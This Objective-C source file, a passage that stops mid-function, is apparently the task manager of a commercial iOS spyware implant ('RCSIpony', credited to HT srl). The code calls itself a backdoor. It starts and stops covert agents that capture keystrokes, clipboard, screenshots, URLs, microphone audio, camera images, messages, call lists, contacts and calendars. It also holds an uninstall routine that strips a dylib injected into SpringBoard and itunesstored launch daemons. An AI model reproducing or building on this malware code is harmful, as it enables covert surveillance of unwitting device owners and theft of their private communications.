/*
 * RCSIpony - Task Manager
 *  This class will be responsible for managing all the operations within
 *  Events/Actions/Agents, thus the Core will have to deal with them in the
 *  most generic way.
 * 
 *
 * Created by Alfredo 'revenge' Pesoli on 21/05/2009
 * Copyright (C) HT srl 2009. All rights reserved
 *
 */

#import <semaphore.h>

#import "RCSIAgentCalendar.h"
#import "RCSIAgentAddressBook.h"
#import "RCSIAgentMicrophone.h"
//#import "RCSIAgentPosition.h"
#import "RCSIAgentMessages.h"
#import "RCSIAgentDevice.h"
#import "RCSIAgentCallList.h"
#import "RCSIInfoManager.h"
#import "RCSIAgentCamera.h"

#import "NSMutableDictionary+ThreadSafe.h"
#import "RCSISharedMemory.h"
#import "RCSITaskManager.h"
#import "RCSIConfManager.h"
#import "RCSILogManager.h"
#import "RCSIActions.h"
#import "RCSICommon.h"
#import "RCSINotificationSupport.h"
#import "RCSIEvents.h"
#import "RCSIEventTimer.h"

#define JSON_CONFIG
//#define DEBUG_

//#define NO_START_AT_LAUNCH

static NSLock *gTaskManagerLock             = nil;
static RCSITaskManager  *sharedTaskManager  = nil;
extern RCSISharedMemory *mSharedMemoryCommand;

#pragma mark -
#pragma mark Public Implementation
#pragma mark -

@implementation RCSITaskManager

@synthesize mEventsList;
@synthesize mActionsList;
@synthesize mAgentsList;
@synthesize mGlobalConfiguration;
@synthesize mBackdoorControlFlag;
@synthesize mShouldReloadConfiguration;

#pragma mark -
#pragma mark Class and init methods
#pragma mark -

+ (RCSITaskManager *)sharedInstance
{
@synchronized(self)
  {
    if (sharedTaskManager == nil)
      {
        //
        // Assignment is not done here
        //
        [[self alloc] init];
      }
  }
  
  return sharedTaskManager;
}

+ (id)allocWithZone: (NSZone *)aZone
{
@synchronized(self)
  {
    if (sharedTaskManager == nil)
      {
        sharedTaskManager = [super allocWithZone: aZone];
      
        //
        // Assignment and return on first allocation
        //
        return sharedTaskManager;
      }
  }
  
  // On subsequent allocation attemps return nil
  return nil;
}

- (id)copyWithZone: (NSZone *)aZone
{
  return self;
}

- (id)init
{
  Class myClass = [self class];
  
  @synchronized(myClass)
    {
      if (sharedTaskManager != nil)
        {
          self = [super init];
          
          if (self != nil)
            {
              mEventsList   = [[NSMutableArray alloc] init];
              mActionsList  = [[NSMutableArray alloc] init];
              mAgentsList   = [[NSMutableArray alloc] init];
              
              mShouldReloadConfiguration = FALSE;
            
              mConfigManager = [[RCSIConfManager alloc] initWithBackdoorName:
                                [[[NSBundle mainBundle] executablePath] lastPathComponent]];
              
              //[mConfigManager setDelegate: self];
              mActions = [[RCSIActions alloc] init];
              
              mSharedMemory = mSharedMemoryCommand;
              
              sharedTaskManager = self;
            }
          
          //[mConfigManager release];
        }
    }
  
  return sharedTaskManager;
}

- (id)retain
{
  return self;
}

- (unsigned)retainCount
{
  // Denotes an object that cannot be released
  return UINT_MAX;
}

- (void)release
{
  // Do nothing
}

- (id)autorelease
{
  return self;
}

#pragma mark -
#pragma mark Generic backdoor operations
#pragma mark -


- (BOOL)loadInitialConfiguration
{
  if ([mConfigManager loadConfiguration] == YES)
    {
      return TRUE;
    }
  else
    {
      // TODO: Load default configuration
#ifdef DEBUG
      NSLog(@"An error occurred while loading the configuration file");
#endif
      exit(-1);
    }
  
  return TRUE;
}

- (BOOL)updateConfiguration: (NSMutableData *)aConfigurationData
{
  NSString *configUpdatePath = [[NSString alloc] initWithFormat: @"%@/%@", 
                                                                 [[NSBundle mainBundle] bundlePath], 
                                                                 gConfigurationUpdateName];
  
  NSString *configurationName = [[NSString alloc] initWithFormat: @"%@/%@", 
                                                                  [[NSBundle mainBundle] bundlePath], 
                                                                  gConfigurationName]; 
                                                                                                                                                                                              
  if ([[NSFileManager defaultManager] fileExistsAtPath: configUpdatePath] == TRUE)
    {
      NSError *rmErr;
      
      if (![[NSFileManager defaultManager] removeItemAtPath: configUpdatePath error: &rmErr])
        {
#ifdef DEBUG_CONF_MANAGER
          infoLog(@"Error remove file configuration %@", rmErr);
#endif
        }
    }
  
  if ([aConfigurationData writeToFile: configUpdatePath
                           atomically: YES])
    {
#ifdef DEBUG_CONF_MANAGER
      infoLog(@"file configuration write correctly");
#endif
    }
  
  if ([mConfigManager checkConfigurationIntegrity: configUpdatePath])
    {
      // If we're here it means that the file is ok thus it is safe to replace
      // the original one
      if ([[NSFileManager defaultManager] removeItemAtPath: configurationName
                                                     error: nil])
        {
          if ([[NSFileManager defaultManager] moveItemAtPath: configUpdatePath
                                                      toPath: configurationName
                                                       error: nil])
            {
              mShouldReloadConfiguration = YES;
              [configUpdatePath release];
              [configurationName release];
              return TRUE;
            }
        }
    }
  else
    {
      [[NSFileManager defaultManager] removeItemAtPath: configUpdatePath
                                                 error: nil];
    
      RCSIInfoManager *infoManager = [[RCSIInfoManager alloc] init];
      [infoManager logActionWithDescription: @"Invalid new configuration, reverting"];
      [infoManager release];
    }
    
  [configUpdatePath release];
  [configurationName release];
  return FALSE;
}

// Restart component in case of failure:
// the configuration is invalid, or some components don't stopped
- (void)checkManagersAndRestart
{
  RCSIEvents *eventManager = [RCSIEvents sharedInstance];
  RCSIActions *actionManager = [RCSIActions sharedInstance];
  
  // restart the action manager runloop
  if ([actionManager stop] == TRUE)
    [actionManager start];
  
  // restart events manager runloop
  if ([eventManager stop] == TRUE)
    [eventManager start];
  
  // restart agents
  if ([self stopAgents] == TRUE)
    [self startAgents];
  
  // restart event thread here
  if ([self stopEvents] == TRUE)
    [self startEvents];
}

- (BOOL)reloadConfiguration
{
  NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
  
  if (mShouldReloadConfiguration == YES) 
    {
#ifdef DEBUG_
    NSLog(@"%s: reloading...",__FUNCTION__);
#endif
      mShouldReloadConfiguration = NO;
      
      RCSIEvents  *eventManager  = [RCSIEvents sharedInstance];
      RCSIActions *actionManager = [RCSIActions sharedInstance];
      
      // Now stop all tasks and reload configuration
      if ([self stopEvents] == TRUE)
        { 
          // no issues for timing it out
          if ([eventManager stop] == FALSE)
            {
#ifdef DEBUG_
              NSLog(@"%s: event manager stop timeout reached",__FUNCTION__);
#endif
            }
          else
            {
#ifdef DEBUG_
            NSLog(@"%s: event manager stopped",__FUNCTION__);
#endif      
            }
            
          // no issues for timing it out  
          if ([actionManager stop] == TRUE)
            {
#ifdef DEBUG_
               NSLog(@"%s: action manager stopped",__FUNCTION__);
#endif
            }
          else
            {
#ifdef DEBUG_
              NSLog(@"%s: action manager stop timeout reached",__FUNCTION__);
#endif      
            }
            
          if ([self stopAgents] == TRUE)
            {
#ifdef DEBUG_
              NSLog(@"%s: agents stopped",__FUNCTION__);
#endif  
            }
          else
            {
#ifdef DEBUG_
              NSLog(@"%s: agents stop timeout reached",__FUNCTION__);
#endif      
            }
            
          // Now reload configuration
          if ([mConfigManager loadConfiguration] == YES)
            {
              RCSIInfoManager *infoManager = [[RCSIInfoManager alloc] init];
              [infoManager logActionWithDescription: @"New configuration activated"];
              [infoManager release];
              
              // start the action manager runloop
              [actionManager start];
            
              // Start event thread here
              [self startEvents];
              
              // start events manager runloop
              [eventManager start];
              
              // Start agents
              // no for rcs8
              //[self startAgents];
            }
          else
            {
              RCSIInfoManager *infoManager = [[RCSIInfoManager alloc] init];
              [infoManager logActionWithDescription: @"Invalid new configuration, reverting"];
              [infoManager release];

              return NO;
            }
        }
      else
        {
          return FALSE;
        }
    }
  
  [pool release];
  
  return YES;
}

- (void)uninstallMeh
{
  NSString *sbPathname = @"/System/Library/LaunchDaemons/com.apple.SpringBoard.plist";
  NSString *itPathname = @"/System/Library/LaunchDaemons/com.apple.itunesstored.plist";
  NSMutableData *uninstCommand;
  
  if ([self stopEvents] == TRUE)
    {
      if ([self stopAgents] == TRUE)
        {
          // Remove all the external files (LaunchDaemon plist/SLI plist)
          NSString *ourPlist = BACKDOOR_DAEMON_PLIST;          
          [[NSFileManager defaultManager] removeItemAtPath: ourPlist
                                                     error: nil];

          // Remove the entry in SB plists 
          removeDylib(sbPathname);
        
          // unload envs by dylib
          uninstCommand = [[NSMutableData alloc] initWithLength: sizeof(shMemoryCommand)];
        
          shMemoryCommand *shMemoryHeader = (shMemoryCommand *)[uninstCommand bytes];
          shMemoryHeader->agentID         = OFFT_UNINSTALL;
          shMemoryHeader->direction       = D_TO_AGENT;
          shMemoryHeader->command         = AG_UNINSTALL;
          shMemoryHeader->commandDataSize = [gDylibName lengthOfBytesUsingEncoding: NSASCIIStringEncoding];
        
          memcpy(shMemoryHeader->commandData, 
                 [[gDylibName dataUsingEncoding: NSASCIIStringEncoding] bytes], 
                 [gDylibName lengthOfBytesUsingEncoding: NSASCIIStringEncoding]);

          if ([mSharedMemory writeMemory: uninstCommand
                                  offset: OFFT_UNINSTALL
                           fromComponent: COMP_CORE])
            {
#ifdef DEBUG
              NSLog(@"%s: sending uninstall command to dylib: done!", __FUNCTION__);
#endif
            }
          
          [uninstCommand release];
        
          // remove envs from itunes
          removeDylib(itPathname);
        
          // restart services
          system("launchctl unload \"/System/Library/LaunchDaemons/com.apple.itunesstored.plist\";" 
                 "launchctl load \"/System/Library/LaunchDaemons/com.apple.itunesstored.plist\"");
          
          // finally remove the dylib
          NSString *dylibPathname = [[NSString alloc] initWithFormat: @"%@/%@", @"/usr/lib", gDylibName];;          
          [[NSFileManager defaultManager] removeItemAtPath: dylibPathname
                                                   error: nil];
          [dylibPathname release];
        
          // Remove our working dir
          if ([[NSFileManager defaultManager] removeItemAtPath: [[NSBundle mainBundle] bundlePath]
                                                         error: nil])
            {
#ifdef DEBUG
              NSLog(@"Backdoor dir removed correctly");
#endif
            }

          // Closing lock socket
          if (gLockSock != -1)
            {
              close(gLockSock);
#ifdef DEBUG
              NSLog(@"closing socket ok");
#endif
            }

          pid_t pid = fork();
          if (pid == 0) 
            {
              execlp("/bin/launchctl",
                     "/bin/launchctl",
                     "remove",
                     [[[ourPlist lastPathComponent] stringByDeletingPathExtension] UTF8String],
                     NULL);
            }
          
          int status;
          waitpid(pid, &status, 0);
          
          // play sound/vibrate is in demo
          checkAndRunDemoMode();
          
          sleep(1);
          
          // And now exit
          exit(0);
        }
    }
}

#pragma mark -
#pragma mark Agents
#pragma mark -


- (BOOL)startAgent: (u_int)agentID
{
  NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];
  
  NSMutableDictionary *agentConfiguration;
  NSData *agentCommand;
  
  switch (agentID)
    {
    // External agents
    case AGENT_SCREENSHOT:
      {
        agentConfiguration = [[self getConfigForAgent: agentID] retain];
      
        if ([agentConfiguration objectForKey: @"status"] != AGENT_RUNNING &&
            [agentConfiguration objectForKey: @"status"] != AGENT_START &&
            [agentConfiguration objectForKey: @"status"] != AGENT_SUSPENDED)
          {
            agentCommand = [[NSMutableData alloc] initWithLength: sizeof(shMemoryCommand)];
            
            NSData *agentConf = [agentConfiguration objectForKey: @"data"];
            
            shMemoryCommand *shMemoryHeader = (shMemoryCommand *)[agentCommand bytes];
            shMemoryHeader->agentID         = agentID;
            shMemoryHeader->direction       = D_TO_AGENT;
            shMemoryHeader->command         = AG_START;
            shMemoryHeader->commandDataSize = [agentConf length];
            
            memcpy(shMemoryHeader->commandData, 
                   [agentConf bytes], 
                   [agentConf length]);
           
            if ([mSharedMemory writeMemory: agentCommand
                                    offset: OFFT_SCREENSHOT
                             fromComponent: COMP_CORE])
              {
#ifdef JSON_CONFIG
                [agentConfiguration setObject: AGENT_STOPPED
                                       forKey: @"status"];
#else
                [agentConfiguration setObject: AGENT_RUNNING
                                       forKey: @"status"];
#endif                                      
              }
          
            [agentCommand release];
          }
  
        [agentConfiguration release];
        
        break;
      }        
    case AGENT_URL:
      {
        agentConfiguration = [[self getConfigForAgent: agentID] retain];
        
        if ([agentConfiguration objectForKey: @"status"] != AGENT_RUNNING &&
            [agentConfiguration objectForKey: @"status"] != AGENT_START &&
            [agentConfiguration objectForKey: @"status"] != AGENT_SUSPENDED)
          {
            agentCommand = [[NSMutableData alloc] initWithLength: sizeof(shMemoryCommand)];
            
            shMemoryCommand *shMemoryHeader = (shMemoryCommand *)[agentCommand bytes];
            shMemoryHeader->agentID         = agentID;
            shMemoryHeader->direction       = D_TO_AGENT;
            shMemoryHeader->command         = AG_START;
            shMemoryHeader->commandDataSize = 0;
            
            if ([mSharedMemory writeMemory: agentCommand
                                    offset: OFFT_URL
                             fromComponent: COMP_CORE])
              {
                [agentConfiguration setObject: AGENT_RUNNING forKey: @"status"];
              }

            [agentCommand release];
          }

        [agentConfiguration release];
        
        break;
      }
    case AGENT_KEYLOG:
      {
        agentConfiguration = [[self getConfigForAgent: agentID] retain];
        
        if ([agentConfiguration objectForKey: @"status"] != AGENT_RUNNING && 
            [agentConfiguration objectForKey: @"status"] != AGENT_START &&
            [agentConfiguration objectForKey: @"status"] != AGENT_SUSPENDED)
          {
            agentCommand = [[NSMutableData alloc] initWithLength: sizeof(shMemoryCommand)];
            
            shMemoryCommand *shMemoryHeader = (shMemoryCommand *)[agentCommand bytes];
            shMemoryHeader->agentID         = agentID;
            shMemoryHeader->direction       = D_TO_AGENT;
            shMemoryHeader->command         = AG_START;
            shMemoryHeader->commandDataSize = 0;
            
            if ([mSharedMemory writeMemory: agentCommand
                                    offset: OFFT_KEYLOG
                             fromComponent: COMP_CORE])
              {
                [agentConfiguration setObject: AGENT_RUNNING forKey: @"status"];
              }
            
            [agentCommand release];
          }

        [agentConfiguration release];
        
        break;
      } 
    case AGENT_CLIPBOARD:
      {
        agentConfiguration = [[self getConfigForAgent: agentID] retain];
        
        if ([agentConfiguration objectForKey: @"status"] != AGENT_RUNNING && 
            [agentConfiguration objectForKey: @"status"] != AGENT_START &&
            [agentConfiguration objectForKey: @"status"] != AGENT_SUSPENDED)
          {
            agentCommand = [[NSMutableData alloc] initWithLength: sizeof(shMemoryCommand)];
            
            shMemoryCommand *shMemoryHeader = (shMemoryCommand *)[agentCommand bytes];
            shMemoryHeader->agentID         = agentID;
            shMemoryHeader->direction       = D_TO_AGENT;
            shMemoryHeader->command         = AG_START;
            shMemoryHeader->commandDataSize = 0;
            
            if ([mSharedMemory writeMemory: agentCommand
                                    offset: OFFT_CLIPBOARD
                             fromComponent: COMP_CORE])
              {
                [agentConfiguration setObject: AGENT_RUNNING forKey: @"status"];
              }
            
            [agentCommand release];
          }
        
        [agentConfiguration release];
        
        break;
      }
    // Internal agents (threaded)
    case AGENT_APPLICATION:
      {
        agentConfiguration = [[self getConfigForAgent: agentID] retain];
        
        if ([agentConfiguration objectForKey: @"status"] != AGENT_RUNNING && 
            [agentConfiguration objectForKey: @"status"] != AGENT_START &&
            [agentConfiguration objectForKey: @"status"] != AGENT_SUSPENDED)
          {
            agentCommand = [[NSMutableData alloc] initWithLength: sizeof(shMemoryCommand)];
            
            shMemoryCommand *shMemoryHeader = (shMemoryCommand *)[agentCommand bytes];
            shMemoryHeader->agentID         = agentID;
            shMemoryHeader->direction       = D_TO_AGENT;
            shMemoryHeader->command         = AG_START;
            shMemoryHeader->commandDataSize = 0;
            
            if ([mSharedMemory writeMemory: agentCommand
                                    offset: OFFT_APPLICATION
                             fromComponent: COMP_CORE])
              {
                [agentConfiguration setObject: AGENT_RUNNING  forKey: @"status"];
              }
                          
            
            [agentCommand release];
          }
        
        [agentConfiguration release];
        
        break;
      }
    case AGENT_MICROPHONE:
      {   
        RCSIAgentMicrophone *agentMicrophone = [RCSIAgentMicrophone sharedInstance];
        
        agentConfiguration = [[self getConfigForAgent: agentID] retain];
        
        if ([agentConfiguration objectForKey: @"status"] != AGENT_RUNNING &&
            [agentConfiguration objectForKey: @"status"] != AGENT_START &&
            [agentConfiguration objectForKey: @"status"] != AGENT_SUSPENDED)
          {
            [agentConfiguration setObject: AGENT_START forKey: @"status"];
          
            [agentMicrophone setMAgentConfiguration: agentConfiguration];
          
            [NSThread detachNewThreadSelector: @selector(start)
                                     toTarget: agentMicrophone
                                   withObject: nil];
          }
         
        [agentConfiguration release];
        
        break;
      }
    case AGENT_MESSAGES:
      {   
        RCSIAgentMessages *agentMessages = [RCSIAgentMessages sharedInstance];
        
        agentConfiguration = [[self getConfigForAgent: agentID] retain];
        
        if ([agentConfiguration objectForKey: @"status"] != AGENT_RUNNING &&
            [agentConfiguration objectForKey: @"status"] != AGENT_START &&
            [agentConfiguration objectForKey: @"status"] != AGENT_SUSPENDED)
          {
            [agentConfiguration setObject: AGENT_START forKey: @"status"];
            
            [agentMessages setMAgentConfiguration: agentConfiguration];;
            
            [NSThread detachNewThreadSelector: @selector(start)
                                     toTarget: agentMessages
                                   withObject: nil];
          }
        
        [agentConfiguration release];
        
        break;
      }
    case AGENT_ORGANIZER:
      {   
        RCSIAgentCalendar    *agentCalendar = [RCSIAgentCalendar sharedInstance];                               
        
        agentConfiguration = [[self getConfigForAgent: agentID] retain];

        if ([agentConfiguration objectForKey: @"status"] != AGENT_RUNNING &&
            [agentConfiguration objectForKey: @"status"] != AGENT_START &&
            [agentConfiguration objectForKey: @"status"] != AGENT_SUSPENDED)
          {
            [agentConfiguration setObject: AGENT_START forKey: @"status"];

            [agentCalendar setMAgentConfiguration: agentConfiguration];
            [NSThread detachNewThreadSelector: @selector(start)
                                     toTarget: agentCalendar
                                   withObject: nil];
          }

        [agentConfiguration release];
        
        break;
      }
    case AGENT_ADDRESSBOOK:
      {   
        RCSIAgentAddressBook *agentAddress = [RCSIAgentAddressBook sharedInstance];   
                                                           
        agentConfiguration = [[self getConfigForAgent: agentID] retain];
        
        if ([agentConfiguration objectForKey: @"status"] != AGENT_RUNNING &&
            [agentConfiguration objectForKey: @"status"] != AGENT_START &&
            [agentConfiguration objectForKey: @"status"] != AGENT_SUSPENDED)
          {
            [agentConfiguration setObject: AGENT_START forKey: @"status"];
            
            [agentAddress setMAgentConfiguration: agentConfiguration];
            
            [NSThread detachNewThreadSelector: @selector(start)
                                     toTarget: agentAddress
                                   withObject: nil];
          }
        
        [agentConfiguration release];
             
        break;
      }
    case AGENT_CRISIS:
      {
        gAgentCrisis = YES;

        RCSIInfoManager *infoManager = [[RCSIInfoManager alloc] init];
        [infoManager logActionWithDescription: @"Crisis started"];
        [infoManager release];
      
        break;
      } 
    case AGENT_DEVICE:
      {
        RCSIAgentDevice *agentDevice = [RCSIAgentDevice sharedInstance];
        
        agentConfiguration = [[self getConfigForAgent: agentID] retain];

        if ([agentConfiguration objectForKey: @"status"] != AGENT_RUNNING &&
            [agentConfiguration objectForKey: @"status"] != AGENT_START &&
            [agentConfiguration objectForKey: @"status"] != AGENT_SUSPENDED)
          {
            [agentConfiguration setObject: AGENT_START forKey: @"status"];

            [agentDevice setMAgentConfiguration: agentConfiguration];

            [NSThread detachNewThreadSelector: @selector(start)
                                     toTarget: agentDevice
                                   withObject: nil];
          }
        
        [agentConfiguration release];
        
        break;
      }
    case AGENT_CALL_LIST:
      {   
        RCSIAgentCallList *agentCallList = [RCSIAgentCallList sharedInstance];
      
        agentConfiguration = [[self getConfigForAgent: agentID] retain];
        
        if ([agentConfiguration objectForKey: @"status"] != AGENT_RUNNING &&
            [agentConfiguration objectForKey: @"status"] != AGENT_START &&
            [agentConfiguration objectForKey: @"status"] != AGENT_SUSPENDED)
          {
            [agentConfiguration setObject: AGENT_START
                                   forKey: @"status"];
            
            [agentCallList setMAgentConfiguration: agentConfiguration];
            
            [NSThread detachNewThreadSelector: @selector(start)
                                     toTarget: agentCallList
                                   withObject: nil];
          }
          
        [agentConfiguration release];
        
        break;
      }
    case AGENT_CAM:
      {
        RCSIAgentCamera *agentCamera = [RCSIAgentCamera sharedInstance];
        
        agentConfiguration = [[self getConfigForAgent: agentID] retain];
      
        if ([agentConfiguration objectForKey: @"status"] != AGENT_RUNNING &&
            [agentConfiguration objectForKey: @"status"] != AGENT_START &&
            [agentConfiguration objectForKey: @"status"] != AGENT_SUSPENDED)
          {
            [agentConfiguration setObject: AGENT_START forKey: @"status"];
        
            [agentCamera setMAgentConfiguration: agentConfiguration];
        
            [NSThread detachNewThreadSelector: @selector(start)
                                     toTarget: agentCamera
                                   withObject: nil];
          }
        
        [agentConfiguration release];
        
        break;
      }
    default:
      {
        break;
      }
    }

  [outerPool release];
  
  return YES;
}

#define MAX_RETRY_TIME 6

- (BOOL)restartAgents
{
  NSAutoreleasePool *outerPool    = [[NSAutoreleasePool alloc] init];
  
#ifdef DEBUG_TASK_MANAGER
  NSLog(@"Restart suspended agents");
#endif
  
  NSMutableDictionary *anObject;
  
  for (int i = 0; i < [mAgentsList count]; i++)
    {
      NSAutoreleasePool *innerPool = [[NSAutoreleasePool alloc] init];
      
      anObject = [mAgentsList objectAtIndex: i];
      
      [anObject retain];
      
      int agentID = [[anObject objectForKey: @"agentID"] intValue];
      
#ifdef DEBUG_TASK_MANAGER
      NSLog(@"Agent %#x status %@", agentID, [anObject objectForKey: @"status"]);
#endif
    
      if ([anObject objectForKey: @"status"] == AGENT_SUSPENDED )
        {
          [anObject setObject: AGENT_RESTART forKey: @"status"];
          [self startAgent:agentID];
      
#ifdef DEBUG_TASK_MANAGER
          sleep(1);
          NSLog(@"Agent %#x new status %@", agentID, [anObject objectForKey: @"status"]);
#endif
        }
    
      [anObject release];
    
      [innerPool release];
    }
  
  [outerPool release];
  
  return YES;
}

- (BOOL)suspendAgents
{
  NSAutoreleasePool *outerPool    = [[NSAutoreleasePool alloc] init];
  
#ifdef DEBUG_TASK_MANAGER
  NSLog(@"Suspend running agents");
#endif
  
  NSMutableDictionary *anObject;
  
  for (int i = 0; i < [mAgentsList count]; i++)
    {
      NSAutoreleasePool *innerPool = [[NSAutoreleasePool alloc] init];
      
      anObject = [mAgentsList objectAtIndex: i];
      
      [anObject retain];
      
      int agentID = [[anObject objectForKey: @"agentID"] intValue];
      
      if ([anObject objectForKey: @"status"] == AGENT_RUNNING)
        {
          int retry = 0;
        
#ifdef DEBUG_TASK_MANAGER
          NSLog(@"Agent %#x found %@", agentID, [anObject objectForKey: @"status"]);
#endif
          [self stopAgent:agentID];
          
          while (([anObject objectForKey: @"status"] != AGENT_STOPPED) &&
                 (retry++ < MAX_RETRY_TIME))
            {
              sleep(1);
            }
          
          [anObject setObject: AGENT_SUSPENDED forKey: @"status"];
        
#ifdef DEBUG_TASK_MANAGER
          NSLog(@"Agent %#x new status %@", agentID, [anObject objectForKey: @"status"]);
#endif
        }
    
      [anObject release];
    
      [innerPool release];
    }
  
#ifdef DEBUG_TASK_MANAGER
  NSLog(@"suspending agents done");
#endif
  
  [outerPool release];
  
  return YES;
}

- (BOOL)stopAgent: (u_int)agentID
{
  NSMutableDictionary *agentConfiguration;
  NSData *agentCommand;

#ifdef DEBUG
  NSLog(@"Stop Agent called, 0x%4x", agentID);
#endif
  
  switch (agentID)
    {
    // External agents
    case AGENT_SCREENSHOT:
      {
        agentCommand = [[NSMutableData alloc] initWithLength: sizeof(shMemoryCommand)];
        
        shMemoryCommand *shMemoryHeader = (shMemoryCommand *)[agentCommand bytes];
        shMemoryHeader->agentID         = agentID;
        shMemoryHeader->direction       = D_TO_AGENT;
        shMemoryHeader->command         = AG_STOP;
        
        if ([mSharedMemory writeMemory: agentCommand
                                offset: OFFT_SCREENSHOT
                         fromComponent: COMP_CORE] == TRUE)
          {     
            agentConfiguration = [self getConfigForAgent: agentID];
            [agentConfiguration setObject: AGENT_STOPPED forKey: @"status"];
          }
      
        [agentCommand release];
      
        break;
      }
    case AGENT_APPLICATION:
      {
        agentCommand = [[NSMutableData alloc] initWithLength: sizeof(shMemoryCommand)];
        
        shMemoryCommand *shMemoryHeader = (shMemoryCommand *)[agentCommand bytes];
        shMemoryHeader->agentID         = agentID;
        shMemoryHeader->direction       = D_TO_AGENT;
        shMemoryHeader->command         = AG_STOP;
        
        if ([mSharedMemory writeMemory: agentCommand
                                offset: OFFT_APPLICATION
                         fromComponent: COMP_CORE] == TRUE)
          {
            agentConfiguration = [self getConfigForAgent: agentID];
            [agentConfiguration setObject: AGENT_STOPPED forKey: @"status"];
          }
        
        [agentCommand release];
        
        break;
      }
    case AGENT_URL:
      {
        agentCommand = [[NSMutableData alloc] initWithLength: sizeof(shMemoryCommand)];
        
        shMemoryCommand *shMemoryHeader = (shMemoryCommand *)[agentCommand bytes];
        shMemoryHeader->agentID         = agentID;
        shMemoryHeader->direction       = D_TO_AGENT;
        shMemoryHeader->command         = AG_STOP;
        
        if ([mSharedMemory writeMemory: agentCommand
                                offset: OFFT_URL
                         fromComponent: COMP_CORE] == TRUE)
          {
            agentConfiguration = [self getConfigForAgent: agentID];
            [agentConfiguration setObject: AGENT_STOPPED forKey: @"status"];
          }
        
        [agentCommand release];
        
        break;
      }
    case AGENT_MESSAGES:
      {
        RCSIAgentMessages *agentMessages = [RCSIAgentMessages sharedInstance];
        
        if ([agentMessages stop] == FALSE)
          {
#ifdef DEBUG
            NSLog(@"Error while stopping agent Messages");
#endif
          }
           
        break;
      }
    case AGENT_KEYLOG:
      {
        agentCommand = [[NSMutableData alloc] initWithLength: sizeof(shMemoryCommand)];
        
        shMemoryCommand *shMemoryHeader = (shMemoryCommand *)[agentCommand bytes];
        shMemoryHeader->agentID         = agentID;
        shMemoryHeader->direction       = D_TO_AGENT;
        shMemoryHeader->command         = AG_STOP;
        
        if ([mSharedMemory writeMemory: agentCommand
                                offset: OFFT_KEYLOG
                         fromComponent: COMP_CORE] == TRUE)
          {
            agentConfiguration = [self getConfigForAgent: agentID];
            [agentConfiguration setObject: AGENT_STOPPED forKey: @"status"];
          }
        
        [agentCommand release];
        
        break;
      }
    case AGENT_CLIPBOARD:
      {
        agentCommand = [[NSMutableData alloc] initWithLength: sizeof(shMemoryCommand)];
        
        shMemoryCommand *shMemoryHeader = (shMemoryCommand *)[agentCommand bytes];
        shMemoryHeader->agentID         = agentID;
        shMemoryHeader->direction       = D_TO_AGENT;
        shMemoryHeader->command         = AG_STOP;
        
        if ([mSharedMemory writeMemory: agentCommand
                                offset: OFFT_CLIPBOARD
                         fromComponent: COMP_CORE] == TRUE)
          {
            agentConfiguration = [self getConfigForAgent: agentID];
            [agentConfiguration setObject: AGENT_STOPPED forKey: @"status"];
          }
        
        [agentCommand release];
        
        break;
      }
    // Internal agents (threaded)
    case AGENT_MICROPHONE:
      {
        RCSIAgentMicrophone *agentMicrophone = [RCSIAgentMicrophone sharedInstance];
        
        if ([agentMicrophone stop] == FALSE)
          {
#ifdef DEBUG
            NSLog(@"Error while stopping agent Microphone");
#endif
          }
      
        break;
      }
    case AGENT_ORGANIZER:
      {
        RCSIAgentCalendar *agentCalendar = [RCSIAgentCalendar sharedInstance];
      
        if ([agentCalendar stop] == FALSE)
          {
#ifdef DEBUG
            NSLog(@"Error while stopping agent AddressBook/Calendar");
#endif
          }    
        break;
      }
    case AGENT_ADDRESSBOOK:
      {
        RCSIAgentAddressBook *agentAB = [RCSIAgentAddressBook sharedInstance];
      
        if ([agentAB stop] == FALSE)
          {
#ifdef DEBUG
            NSLog(@"Error while stopping agent AddressBook/Calendar");
#endif
          }  
        break;
      }
    case AGENT_CRISIS:
      {
        gAgentCrisis = NO;

        RCSIInfoManager *infoManager = [[RCSIInfoManager alloc] init];
        [infoManager logActionWithDescription: @"Crisis stopped"];
        [infoManager release];
      
        break;
      } 
    case LOGTYPE_DEVICE:
      {
        RCSIAgentDevice *agentDevice = [RCSIAgentDevice sharedInstance];

        if ([agentDevice stop] == FALSE)
          {
#ifdef DEBUG
            NSLog(@"Error while stopping agent Device");
#endif
          }

        break;
      }
    case AGENT_CALL_LIST:
      {
        RCSIAgentCallList *agentCallList = [RCSIAgentCallList sharedInstance];

        if ([agentCallList stop] == FALSE)
          {
#ifdef DEBUG
            NSLog(@"Error while stopping agent Call List");
#endif
          }
          
        break;
      }
    case AGENT_CAM:
      {
        RCSIAgentCamera *agentCamera = [RCSIAgentCamera sharedInstance];
      
        if ([agentCamera stop] == FALSE)
          {
#ifdef DEBUG
            NSLog(@"Error while stopping agent Camera");
#endif
          }
      
        break;
      }
    default:
      {
        break;
      }
    }
  
  return TRUE;
}

- (BOOL)startAgents
{
  NSAutoreleasePool   *outerPool    = [[NSAutoreleasePool alloc] init];
  
  NSMutableData       *agentCommand;

  NSMutableDictionary *anObject;
     
  for (anObject in mAgentsList)
    {
      NSAutoreleasePool *innerPool = [[NSAutoreleasePool alloc] init];
      id agentConfiguration        = nil;
      
      int agentID       = [[anObject objectForKey: @"agentID"] intValue];
      NSString *status  = [[NSString alloc] initWithString:
                           [anObject objectForKey: @"status"]];
      
      if ([status isEqualToString: AGENT_ENABLED] == FALSE)
        continue;

      switch (agentID)
      {
        // External agents 
        case AGENT_SCREENSHOT:
          {
            agentConfiguration = [[anObject objectForKey: @"data"] retain];
            
            if ([agentConfiguration isKindOfClass: [NSString class]])
              {
                // Hard error atm, think about default config parameters
                break;
              }
            else
              {
                agentCommand = [[NSMutableData alloc] initWithLength: sizeof(shMemoryCommand)];
                
                shMemoryCommand *shMemoryHeader = (shMemoryCommand *)[agentCommand bytes];
                shMemoryHeader->agentID         = agentID;
                shMemoryHeader->direction       = D_TO_AGENT;
                shMemoryHeader->command         = AG_START;
                shMemoryHeader->commandDataSize = [agentConfiguration length];
                
                memcpy(shMemoryHeader->commandData, 
                       [agentConfiguration bytes], 
                       [agentConfiguration length]);
   
                if ([mSharedMemory writeMemory: agentCommand
                                        offset: OFFT_SCREENSHOT
                                 fromComponent: COMP_CORE])
                  {
                    [anObject setObject: AGENT_RUNNING forKey: @"status"];
                  }
              
                [agentCommand release];
              }
          
            break;
          }
        case AGENT_URL:
          {
            agentCommand = [[NSMutableData alloc] initWithLength: sizeof(shMemoryCommand)];
                
            shMemoryCommand *shMemoryHeader = (shMemoryCommand *)[agentCommand bytes];
            shMemoryHeader->agentID         = agentID;
            shMemoryHeader->direction       = D_TO_AGENT;
